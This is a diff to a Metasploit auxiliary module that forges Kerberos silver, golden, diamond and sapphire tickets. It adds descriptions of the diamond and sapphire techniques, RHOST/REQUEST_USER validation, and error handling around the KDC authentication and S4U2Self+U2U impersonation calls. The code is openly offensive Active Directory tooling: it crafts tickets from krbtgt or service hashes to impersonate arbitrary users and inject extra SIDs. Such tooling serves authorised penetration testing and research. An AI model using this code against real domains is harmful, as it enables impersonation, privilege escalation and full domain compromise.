@@ -12,12 +12,13 @@ class MetasploitModule < Msf::Auxiliary
     super(
       update_info(
         info,
-        'Name' => 'Kerberos Silver/Golden Ticket Forging',
+        'Name' => 'Kerberos Silver/Golden/Diamond/Sapphire Ticket Forging',
         'Description' => %q{
           This module forges a Kerberos ticket. Four different techniques can be used:
           - Silver ticket: Using a service account hash, craft a ticket impersonating any user and privileges to that account.
           - Golden ticket: Using the krbtgt hash, craft a ticket impersonating any user and privileges.
-          - Diamond ticket: Authenticate to
+          - Diamond ticket: Authenticate to the domain controller, and using the krbtgt hash, copy the PAC from the authenticated user to a forged ticket.
+          - Sapphire ticket: Use the S4U2Self+U2U trick to retrieve the PAC of another user, then use the krbtgt hash to craft a forged ticket.
         },
         'Author' => [
           'Benjamin Delpy', # Original Implementation
@@ -30,10 +31,10 @@ class MetasploitModule < Msf::Auxiliary
         ],
         'License' => MSF_LICENSE,
         'Notes' => {
-          'Stability' => [],
-          'SideEffects' => [],
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [IOC_IN_LOGS],
           'Reliability' => [],
-          'AKA' => ['Silver Ticket', 'Golden Ticket', 'Diamond Ticket', 'Sapphire Ticket', 'Ticketer', 'Klist']
+          'AKA' => ['Silver Ticket', 'Golden Ticket', 'diamond', 'sapphire', 'Ticketer', 'Klist']
         },
         'Actions' => [
           ['FORGE_SILVER', { 'Description' => 'Forge a Silver Ticket' } ],
@@ -59,7 +60,6 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('EXTRA_SIDS', [ false, 'Extra sids separated by commas, Ex: S-1-5-21-1755879683-3641577184-3486455962-519']),
         OptString.new('SPN', [ false, 'The Service Principal Name (Only used for silver ticket)'], conditions: %w[ACTION == FORGE_SILVER]),
         OptInt.new('DURATION', [ false, 'Duration of the ticket in days', 3650], conditions: forged_manually_condition),
-
         OptString.new('REQUEST_USER', [false, 'The user to request a ticket for, to base the forged ticket on'], conditions: based_on_real_ticket_condition),
         OptString.new('REQUEST_PASSWORD', [false, "The user's password, used to retrieve a base ticket"], conditions: based_on_real_ticket_condition),
         OptAddress.new('RHOSTS', [false, 'The address of the KDC' ], conditions: based_on_real_ticket_condition),
@@ -130,7 +130,7 @@ class MetasploitModule < Msf::Auxiliary
     validate_sid!
     validate_key!
     sname = datastore['SPN'].split('/', 2)
-    flags = Rex::Proto::Kerberos::Model::TicketFlags.from_flags(silver_ticket_flags)
+    flags = Rex::Proto::Kerberos::Model::TicketFlags.from_flags(tgs_flags)
     forge_ccache(sname: sname, flags: flags, is_golden: false)
   end
 
@@ -138,11 +138,12 @@ class MetasploitModule < Msf::Auxiliary
     validate_sid!
     validate_key!
     sname = ['krbtgt', datastore['DOMAIN'].upcase]
-    flags = Rex::Proto::Kerberos::Model::TicketFlags.from_flags(golden_ticket_flags)
+    flags = Rex::Proto::Kerberos::Model::TicketFlags.from_flags(tgt_flags)
     forge_ccache(sname: sname, flags: flags, is_golden: true)
   end
 
   def forge_diamond
+    validate_remote
     validate_key!
 
     begin
@@ -159,8 +160,9 @@ class MetasploitModule < Msf::Auxiliary
 
       tgt_result = send_request_tgt(**options)
     rescue ::Rex::Proto::Kerberos::Model::Error::KerberosError => e
-      print_error("Requesting TGT failed: #{e.message}")
-      return
+      fail_with(Msf::Exploit::Failure::UnexpectedReply, "Requesting TGT failed: #{e.message}")
+    rescue Rex::HostUnreachable => e
+      fail_with(Msf::Exploit::Failure::Unreachable, "Requesting TGT failed: #{e.message}")
     end
 
     if tgt_result.krb_enc_key[:enctype] != enc_type
@@ -169,7 +171,7 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     ticket = modify_ticket(tgt_result.as_rep.ticket, tgt_result.decrypted_part, datastore['USER'], datastore['USER_RID'], datastore['DOMAIN'], extra_sids, enc_key, enc_type, enc_key, false)
-    ticket = Msf::Exploit::Remote::Kerberos::Ticket::Storage.store_ccache(ticket, framework_module: self, host: datastore['RHOST'])
+    Msf::Exploit::Remote::Kerberos::Ticket::Storage.store_ccache(ticket, framework_module: self, host: datastore['RHOST'])
 
     if datastore['VERBOSE']
       print_ccache_contents(ticket, key: enc_key)
@@ -177,13 +179,21 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def forge_sapphire
+    validate_remote
+    validate_key!
     options = {
       stop_if_preauth_not_required: false
     }
     enc_key, enc_type = get_enc_key_and_type
     include_crypto_params(options, enc_key, enc_type)
 
-    auth_context = kerberos_authenticator.authenticate_via_kdc(options)
+    begin
+      auth_context = kerberos_authenticator.authenticate_via_kdc(options)
+    rescue ::Rex::Proto::Kerberos::Model::Error::KerberosError => e
+      fail_with(Msf::Exploit::Failure::UnexpectedReply, "Error authenticating to KDC: #{e}")
+    rescue Rex::HostUnreachable => e
+      fail_with(Msf::Exploit::Failure::Unreachable, "Requesting TGT failed: #{e.message}")
+    end
     credential = auth_context[:credential]
 
     print_status("#{peer} - Using U2U to impersonate #{datastore['USER']}@#{datastore['DOMAIN']}")
@@ -193,12 +203,27 @@ class MetasploitModule < Msf::Auxiliary
       value: credential.keyblock.data.value
     )
 
-    tgs_ticket, tgs_auth = kerberos_authenticator.u2uself(credential, impersonate: datastore['USER'])
-    ticket = modify_ticket(tgs_ticket, tgs_auth, datastore['USER'], datastore['USER_RID'], datastore['DOMAIN'], extra_sids, session_key.value, enc_type, enc_key, true)
-    ticket = Msf::Exploit::Remote::Kerberos::Ticket::Storage.store_ccache(ticket, framework_module: self, host: datastore['RHOST'])
+    begin
+      tgs_ticket, tgs_auth = kerberos_authenticator.u2uself(credential, impersonate: datastore['USER'])
+    rescue ::Rex::Proto::Kerberos::Model::Error::KerberosError => e
+      fail_with(Msf::Exploit::Failure::UnexpectedReply, "Error executing S4U2Self+U2U: #{e}")
+    rescue Rex::HostUnreachable => e
+      fail_with(Msf::Exploit::Failure::Unreachable, "Error executing S4U2Self+U2U: #{e.message}")
+    end
+    # Don't pass a user RID in: we'll retrieve it from the decrypted PAC
+    ticket = modify_ticket(tgs_ticket, tgs_auth, datastore['USER'], nil, datastore['DOMAIN'], extra_sids, session_key.value, enc_type, enc_key, true)
+    Msf::Exploit::Remote::Kerberos::Ticket::Storage.store_ccache(ticket, framework_module: self, host: datastore['RHOST'])
 
     if datastore['VERBOSE']
       print_ccache_contents(ticket, key: enc_key)
+    end
+  end
+
+  def validate_remote
+    if datastore['RHOST'].nil? || datastore['RHOST'].empty?
+      fail_with(Msf::Exploit::Failure::BadConfig, 'Must specify RHOST for sapphire and diamond tickets')
+    elsif datastore['REQUEST_USER'].nil? || datastore['REQUEST_USER'].empty?
+      fail_with(Msf::Exploit::Failure::BadConfig, 'Must specify REQUEST_USER for sapphire and diamond tickets')
     end
   end
 
